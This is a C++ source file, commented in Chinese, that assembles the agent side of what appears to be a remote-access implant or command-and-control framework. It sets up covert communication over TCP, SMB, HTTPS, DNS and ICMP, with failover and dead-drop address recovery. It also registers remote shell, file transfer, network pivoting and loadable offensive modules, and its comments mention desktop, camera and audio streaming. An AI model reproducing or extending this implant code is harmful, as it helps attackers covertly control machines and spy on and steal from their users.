/**
 * @file AgentContextAssemble.cpp
 * @brief 身份重构⑤: AgentContext 装配方法 —— Setup* 与模块注册。
 * @details 类不变, 实现分布三 TU(见 AgentContext.cpp 文件头)。
 */
#include "AgentContext.hpp"
#include "AgentContextInternals.h"
#include "Core/Comms/CommsManager.hpp"
#include "Core/Comms/Platform/INetworkOps.hpp"
#include "Core/Comms/Channel/ChannelConfig.hpp"
#include "Core/Comms/Channel/Chain.hpp"
#include "Core/Comms/Channel/ChannelRegistry.hpp"
#include "Core/Comms/Platform/IHttpOps.hpp"
#include "Core/Comms/Transports/Icmp/IcmpOps.hpp"
#include "Core/Command/Dispatch/CommandDispatcher.hpp"
#include "Core/Command/Handlers/RegisterCore.hpp"
#include "Core/Command/Intake/CommandProcessor.hpp"
#include "Core/Comms/OutboundSink.hpp"
#include "Core/Comms/OutboundMessages.hpp"
#include "Core/Comms/Session/SessionLoop.hpp"
#include "Core/Comms/Internal/ChannelRateLimiter.hpp"
#include "Core/Identity/SessionIdentity.hpp"
#include "Core/Config/AgentConfig.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/ThirdParty/json.hpp"
#include "Core/Job/JobRuntime.hpp"
#include "Components/Tactics/Framework/TacticManager.hpp"
#include "Components/Pivot/PivotManager.hpp"
#include "Components/Pivot/PipeSessionHub.hpp"
#include "Components/Commands/SystemInfo/Register.hpp"
#include "Components/Services/Shell/Register.hpp"
#include "Components/Jobs/FileTransfer/Register.hpp"
#include "Components/Pivot/Register.hpp"
#include "Components/Pivot/PivotHandlers.hpp"
#include "Core/Module/ModuleManager.hpp"
#include "Core/Command/Queue/CommandWorker.hpp"

#include <algorithm>

using cleat::agentctx_int::FromAgentConfig;


namespace cleat {

    // ========================================================================
    // SetupCommsLayer: 装配通信栈（候选通道 + CommsManager）
    // ========================================================================

    void AgentContext::SetupCommsLayer() {
        // ---- 创建平台网络操作对象 ----
        network_ops_ = CreateNetworkOps();
        machine_id_ops_ = identity::CreateMachineIdOps();

        const auto& cfg = AgentConfig::Instance();

        chain_ = std::make_unique<Chain>();

        // 通道依赖包: 唯一构造点(Internals::BuildChannelDeps) —— 启动/热切换同源。
        // 此前两条路径各自填充, 曾因不对称出过 P4 事故(热切换漏 make_quic → QUIC 消失)。
        ChannelDeps deps = agentctx_int::BuildChannelDeps(network_ops_.get());

        ChannelRegistry registry;
        RegisterBuiltinChannels(registry);

        // P0 启动自检: 报告"注册了但不可用"的通道 —— 缺 caps/from_config、
        // 非豁免的 bootstrap_capable=false、needs_dep 但平台无工厂。零行为变更, 只增可见性:
        // 此前加通道漏改 ChannelOrderForMode 会静默失效, 现在启动即见 WARN。
        {
            const auto issues = registry.SelfCheck(&deps);
            for (const auto& s : issues) {
                LOG_WARN("AgentContext: 通道自检 —— " << s);
            }
            for (const auto& line : registry.DumpDescriptors()) {
                LOG_DEBUG("AgentContext: 通道描述符 · " << line);
            }
        }

        // (收敛后): 候选顺序由**注册表**给出(bootstrap_capable + rank), 装配层不再
        // 维护写死的 mode→顺序表。新增通道只需在 ChannelDescriptor 里声明 bootstrap 资格,
        // 本函数与 Internals 均不再改动。
        const std::vector<std::string> order = registry.BootstrapOrder(cfg.transport_mode);
        // 来源归一: 启动扁平字段 → 输入集合(P2: 无条件填全部槽, 选槽由通道描述符自负, 此处零特判)
        std::vector<agentctx_int::ChannelMaterializeInput> inputs;
        inputs.reserve(order.size());
        for (const std::string& type : order) {
            inputs.push_back({ type, FromAgentConfig(cfg, type) });
        }

        // 候选链物化(**唯一实现**, 见 Internals): 本函数只做"来源归一", 物化/记账/日志
        // 全在 MaterializeChannels —— 与 ReloadChannels 同一份实现, 差异仅物化策略。
        // 此前与 ReloadChannels 各持一份手写副本(两路径曾不对称, QUIC 热切换丢失的结构根因)。
        // valid 判据未过(未配置)不记 failed —— 交给快照组装的探测三态(服务端可区分
        // "支持但没配" vs "根本不支持", 如裁剪形态的 quic)。
        auto mat = agentctx_int::MaterializeChannels(
            registry, deps, inputs, agentctx_int::kMaterializeBootstrapPolicy);
        for (auto& cand : mat.candidates) {
            chain_->AddCandidate(std::move(cand.first), std::move(cand.second));
        }

        LOG_INFO("AgentContext: 候选数=" << chain_->CandidateCount()
            << " mode=" << cfg.transport_mode << " 来源=bootstrap");

        // 通道能力快照入 AgentConfig(AgentDescribe 转发给服务端; 三态语义见 Internals)
        AgentConfig::Instance().SetChannelCapabilities(
            agentctx_int::BuildChannelCapsSnapshot(
                registry, order, mat.caps_active, mat.caps_failed, deps));

        network_ = std::make_unique<CommsManager>(*chain_);
        dead_drop_ = std::make_unique<deaddrop::DeadDropManager>();
        machine_identity_ = std::make_unique<identity::MachineIdentity>(*machine_id_ops_);
        dispatcher_ = std::make_unique<CommandDispatcher>();
        //  出站唯一出口。先于 processor_/session_loop_ 构造(它们都依赖它)
        sink_ = std::make_unique<OutboundSink>(*chain_);
        // 诊断重构 ①: EventReporter 出站绑定(SendData 收口 → 组件帧统一路径)
        event_reporter_.SetSender([this](const std::vector<uint8_t>& f) {
            SendOptions opt;
            opt.kind = SendKind::Event;         // 遥测: 无按命令限流身份
            return Consumed(sink_->Send(f, opt));
            });
        processor_ = std::make_unique<CommandProcessor>(*sink_, *dispatcher_);
        session_loop_ = std::make_unique<SessionLoop>(*network_, *sink_, *processor_);
    }

    // ========================================================================
    // SetupCallbacks: 会话循环回调（心跳 / Poll / FirstConnect / EventReport / 换链）
    // ========================================================================

    void AgentContext::SetupCallbacks() {
        // EventReport 队列由主循环每轮发送(锁外) —— 日志线程不再同步调网络
        session_loop_->SetEventReportFlusher([this]() {
            event_reporter_.Drain();   // 诊断重构 ①
            });

        // 限流回执(A.2.3): 超限**不静默丢弃** —— 由 sink 统一上报, 这里按原帧上下文
        // (request_id/session_id)组装错误帧并回执。回执必走 SendLimitReceipt(强制 urgent +
        // 回调期间整体豁免限流), 故"命令永远无响应"这条死路不存在。
        sink_->SetLimitObserver([this](const std::string& cmd,
            ChannelRateLimiter::Decision d, const std::vector<uint8_t>& frame) {
                SendLimitReceipt(cmd, d, frame);
            });

        // channels 热切换: 主循环检测到 SetConfig 下发新通道链后回调此处重建
        //  换链改为**事件订阅** —— 修订号变化时恰好回调一次(去重与派发在
        // SessionRunner 内), 且不受会话状态门限制(Idle 下也要重建链)
        session_loop_->AddChannelsReloadObserver([this](uint64_t rev) {
            LOG_INFO("AgentContext: 换链事件 rev=" << rev << ", 重建候选链");
            ReloadChannels();
            });

        // B3-7 收口: reconnect 域远程下发 → 重配会话退避(Configure 重建 Backoff,
        // 下一次重连即按新参数)。此前该域在 AgentConfig 之外零消费(热值与启动值
        // 双双失效), SessionRunner 一直跑自己的默认值。
        AgentConfig::Instance().SetAppliedObserver([this](const nlohmann::json& applied) {
            if (applied.contains("reconnect")) {
                LOG_INFO("AgentContext: reconnect 域已更新, 重配会话退避");
                session_loop_->ApplySessionConfig();
            }
            });
        // AgentConfig 是永不析构的单例 → 本回调登记注销(装配根治理第 5 步)。
        RegisterTeardown([] { AgentConfig::Instance().SetAppliedObserver(nullptr); });

        // 以下回调全部挂在 session_loop_/sink_ 上(随本对象同生共死) → 无需登记注销。
        session_loop_->SetOnFirstConnectCallback([this]() {
            SendFirstConnect();
            });

        //  死投递触发接线: 连续失败阈值由 RecoveryConfig.recover_after_fails 控制
        session_loop_->SetAddressRecoveryCallback([this]() {
            TryDeadDropRecover();
            });

        session_loop_->SetIsPushChannel([this]() {
            // 当前通道 agency(声明式, CapsForType 映射表): Push = Tcp/Ws/Smb, Poll = Https/Dns/Icmp
            return chain_ && chain_->Current() &&
                CapsForType(chain_->Current()->Type()).agency == ChannelAgency::Push;
            });

        session_loop_->SetHeartbeatCallback([this]() {
            // A3.1: 按 ChannelCaps::agency 分派 —— Poll 通道(HTTPS/DNS/ICMP: GET/事务
            // 本身即保活与取件, 节拍在传输层 PollClock)不再发 HeartbeatPing 帧(冗余拍);
            // Push 通道(TCP 长连接)维持心跳保活。
            if (chain_ && chain_->Current() &&
                CapsForType(chain_->Current()->Type()).agency == ChannelAgency::Poll) {
                return true;
            }
            // 组包收口(M1): 帧 shape(params.session_id 是服务端 msgSessionID 的唯一
            // 读取点, 会话接管靠它)+ SendOptions 声明都在 msg::HeartbeatPing 一处;
            // R2: 返回发送结果, 会话循环失败留痕; 信封 ts 由 FrameBuilder 注入。
            return Consumed(msg::Send(*sink_, msg::HeartbeatPing()));
            });

        session_loop_->SetOnReconnectCallback([this]() {
            SendFirstConnect();
            });
    }

    // ========================================================================
    // SetupInfrastructure: 装配所有 Manager 回调（数据发送 / 低带宽检测等）
    // ========================================================================

    void AgentContext::SetupInfrastructure() {
        // 装配根治理第 5 步: 本函数内每个**跨单例**的裸 this 回调, 都在
        // 注册的**紧邻处**登记其注销闭包(RegisterTeardown)——注册与注销配对出现在
        // PivotManager::SetLowBandwidthCheck 与 ModuleManager::SetRuntimeQueries)。
        // 注: session_loop_/sink_/processor_/event_reporter_ 持有的回调不登记 ——
        //     它们随本对象同生共死, 不存在析构后回调的窗口。

        // ---- 网络状态检测 ----
        // 任务系统 Phase 3: 网络/低带宽/https 三项检查收进 JobCenter
        // (装配唯一注入点; ServiceManager 已删除)
        JobRuntime::SetNetworkCheck([this]() {
            return network_->IsConnected();
            });
        RegisterTeardown([] { JobRuntime::SetNetworkCheck(nullptr); });

        auto low_bandwidth_check = [this]() {
            return chain_ ? chain_->IsLowBandwidth() : false;
            };
        // 任务系统 Phase 2: 任务的低带宽检查收进 JobCenter(装配唯一注入点)
        JobRuntime::SetLowBandwidthCheck(low_bandwidth_check);
        RegisterTeardown([] { JobRuntime::SetLowBandwidthCheck(nullptr); });
        PivotManager::Instance().SetLowBandwidthCheck(low_bandwidth_check);
        RegisterTeardown([] { PivotManager::Instance().SetLowBandwidthCheck(nullptr); });

        //  前置: https 传输下禁用流式服务(桌面/摄像头/录音) ——
        // 裁定落地; 动态谓词, 通道切换(含热切换)后 Start 拒/Send 自停自动生效。
        JobRuntime::SetHttpsStreamForbiddenCheck([this]() {
            if (!chain_) return false;
            const auto cur = chain_->Current();
            return cur && cur->Type() == TransportType::Https;
            });
        RegisterTeardown([] { JobRuntime::SetHttpsStreamForbiddenCheck(nullptr); });

        // ---- 数据发送回调（各 Manager 共享同一出口） ----
        // **唯一注入点**: 各发送回调只在这里接线 —— 不要在别处再注入
        // 同一出口的回调(第二次会静默覆盖第一次; 新出口是 OutboundSink)。
        // 任务系统 Phase 2: 任务/服务的数据出口收进 JobCenter(唯一注入点;
        // bool 返回 = 背压契约 B2-6 不变)。出口随 AgentContext 生命周期, 任务线程收尾
        // 由 CancelAllOfKind 的有界排水兜住。
        JobRuntime::SetDataSender([this](const std::vector<uint8_t>& data) {
            return SendData(data);
            });
        RegisterTeardown([] { JobRuntime::SetDataSender(nullptr); });

        TacticManager::Instance().SetDataSender([this](const std::vector<uint8_t>& data) {
            SendData(data);
            });
        RegisterTeardown([] { TacticManager::Instance().SetDataSender(nullptr); });

        PivotManager::Instance().SetDataSender([this](const std::vector<uint8_t>& data) {
            SendData(data);
            });
        RegisterTeardown([] { PivotManager::Instance().SetDataSender(nullptr); });

        ModuleManager::Instance().SetDataSender([this](const std::vector<uint8_t>& data) {
            return SendData(data);
            });
        RegisterTeardown([] { ModuleManager::Instance().SetDataSender(nullptr); });

        //  订正: **断链时停止高带宽任务与服务**。
        // 为什么不能靠带宽档: `Chain::Disconnect` 会把档位置回 **High**(无通道), 而带宽订阅者
        // 只在 `to == Low` 时停服务 —— 于是断链反而什么都不停, 流式服务继续产出, 把出站队列
        // 塞满并驱逐心跳/上报(这正是  记载的危害)。
        // 故改用**会话状态机**作为权威来源(它才知道"链路不可用"): 进入 `Reconnecting` 即停。
        // 策略与既有 Low→High 一致: **不自动重启**(由操作员显式启动), 避免链路抖动引发反复启停。
        // 注: 本观察者挂在 session_loop_->Runner() 上, 随本对象析构 → 不登记注销。
        session_loop_->Runner().AddStateObserver(
            [this](SessionState from, SessionState to, const SessionEvent& ev) {
                if (to != SessionState::Reconnecting) return;
                // 只在"**离开**一个有链路的态"时停 —— 白名单而非黑名单(首版用黑名单, 于是
                // `Opening --OpenFailed--> Reconnecting` 也触发, 断链期间每轮退避都多停一次
                // 并多打一条 WARN;  真机验证时观察到)。
                if (from != SessionState::Handshaking && from != SessionState::Registering
                    && from != SessionState::Ready) return;
                LOG_WARN("AgentContext: 会话转入重连(" << ToString(from) << " --"
                    << ToString(ev.kind) << "--> Reconnecting) —— 停止高带宽任务与服务");
                // 任务系统 Phase 2/3: 任务无条件停(旧 TaskManager 语义);
                // 流服务同样**无条件**停: 8127a92 曾给流服务收停加
                // "低带宽或 https"门, 于是 TCP/High 断链路径什么都不停 —— 桌面/摄像头/
                // 录音在服务器掉线期间继续产出(塞满出站队列), 重连恢复后又自动续播,
                // 与  修复(断链即停、不自动重启)的意图相悖(回归用例见
                // JobServiceCases: 断链修复_流服务收停不设门)。
                JobRuntime::CancelHighBandwidthOfKind(JobKind::Task);
                JobRuntime::StopStreamServices();
            });

        // 意外确认观测: `Ready` 态收到注册确认 = **服务端为一个本该复用的帧
        // 新建了会话**("两端契约破裂"的可靠性信号)。典型成因: 某类上行帧不带 session_id
        // (流数据/模块回调链路), 服务端按"非注册首帧"对它做匿名注册 —— 实测 HTTPS poll
        // 下一次远程桌面开出 20+ 匿名会话。
        //
        // 为什么单独接线而不是只靠上一条 WARN: 那条日志是**通用 WARN**(文本含状态名,
        // 不同状态各自成 key), 且淹没在日志流里; 这里给出一条**带诊断上下文**的记录 ——
        // 明确点名"服务端在新建会话", operator 才能立刻对上服务端会话列表的爆炸。
        // 上报通道复用既有 LOG_WARN → EventSink(见 Logger::Log), 无需新增管线;
        // 10s 节流 + 按文本去重由 HandleEventReport 承担, 故不会自我放大成风暴。
        // 注: 本观察者无 this 捕获(纯日志), 且挂在 session_loop_->Runner() 上 → 不登记。
        session_loop_->Runner().AddAnomalyObserver(
            [](SessionState state, uint64_t sid) {
                LOG_WARN("AgentContext: 会话已就绪却收到注册确认(状态=" << ToString(state)
                    << ", 服务端分配 session_id=" << sid
                    << ") —— 服务端正在为本机上行帧新建会话(本机 session_id 未被覆盖); "
                    "常见成因: 该类上行帧未携带 session_id 或服务端未复用");
            });

        //  命令的"当前代际"提供者 —— 迟到响应据此丢弃(代际失效的可见产物)。
        // 接线到 SessionRunner 的代际。
        // 注: processor_ 随本对象析构 → 不登记。
        processor_->SetEpochProvider([this] {
            return session_loop_ ? session_loop_->Epoch() : 0;
            });

        //  模块 API v3 的只读查询提供者。三个量各有其主, 在装配根接线 ——
        // 模块侧因此不必再持有自己的 ClientContext 副本(N5)或硬编码链路状态(N8)。
        ModuleManager::RuntimeQueries q;
        q.session_id = [] { return SessionIdentity::Instance().GetSessionId(); };
        q.epoch = [this] {
            return session_loop_ ? session_loop_->Epoch() : 0;
            };
        q.connected = [this] { return network_ ? network_->IsConnected() : false; };
        ModuleManager::Instance().SetRuntimeQueries(std::move(q));
        RegisterTeardown([] {
            ModuleManager::Instance().SetRuntimeQueries(ModuleManager::RuntimeQueries{});
            });
    }

    // ========================================================================
    // StartCommandWorker: 启动命令执行线程
    // ========================================================================

    void AgentContext::StartCommandWorker() {
        CommandWorker& command_worker = CommandWorker::Instance();
        command_worker.SetTaskTimeoutMs(AgentConfig::Instance().GetWorkerTimeoutMs());
        command_worker.Start();
    }

    // ========================================================================
    // RegisterAllHandlers: 注册所有 Feature / Service / Offensive 模块
    // ========================================================================

    void AgentContext::RegisterAllHandlers() {
        // SystemInfoModule = 身份依赖(生存层): FirstConnect 注册帧的主机信息来自其
        // Provider(machine_id 已移至 Core/Identity/MachineIdentity, 身份重构④)。
        // 与 RegisterCore 一样无条件注册, 不得随功能裁剪(MINIMAL 白名单外)。
        sys_provider_ = &modules_.Add<SystemInfoModule>().Provider();

                                                        
        // 生存命令(Exit/SetConfig/SetWorkerTimeout/Ping)无条件注册 ——
        RegisterCore(*dispatcher_);

#ifndef CLEAT_MINIMAL
                            modules_.Add<FunctionModule>(RegisterShell);
            modules_.Add<FunctionModule>(RegisterFileTransfer)
            // 任务系统 Phase 2: 协作式取消 + 有界排水(2s, 同款上限)。
            // 顺序语义不变: 仍是 Service 组之后、Pivot 之前。
            .WithShutdown([] { JobRuntime::CancelAllOfKind(JobKind::Task, 2000); });
                        #endif

        modules_.Add<FunctionModule>(RegisterPivot)
            .WithShutdown([] {
                PivotManager::Instance().CloseAll();
                PipeSessionHub::Instance().StopAll();
            });

        PipeSessionHub::Instance().SetDataSender([this](const std::vector<uint8_t>& data) {
            SendData(data);
            });
        // PipeSessionHub 是永不析构的单例 → 登记注销(装配根治理第 5 步)。
        RegisterTeardown([] { PipeSessionHub::Instance().SetDataSender(nullptr); });

        // 模块命令面: 静态注册(ModuleLoad/Unload/Status)在 RegisterCore(注册点唯一);
        // 此处只注入 dispatcher 供动态注册(module_id 命令) + 挂 shutdown 清理。
        modules_.Add<FunctionModule>([](CommandDispatcher& d) {
            ModuleManager::Instance().AttachDispatcher(d);
            }).WithShutdown([] { ModuleManager::Instance().UnloadAll(); });

        modules_.RegisterAll(*dispatcher_);

        //  订正: 此处曾有第二份 ModuleManager::SetDataSender 注入, 与
        // SetupInfrastructure 那份**逐字相同** —— 第二个静默覆盖第一个。两份"同一件事的
        // 真相"今天行为一致故不显形, 但将来改了一份(例如加 kind/优先级)另一份会把它盖回去,
        // 且没有任何测试会失败。**模块数据发送回调的唯一注入点在 SetupInfrastructure**。
    }

} // namespace cleat
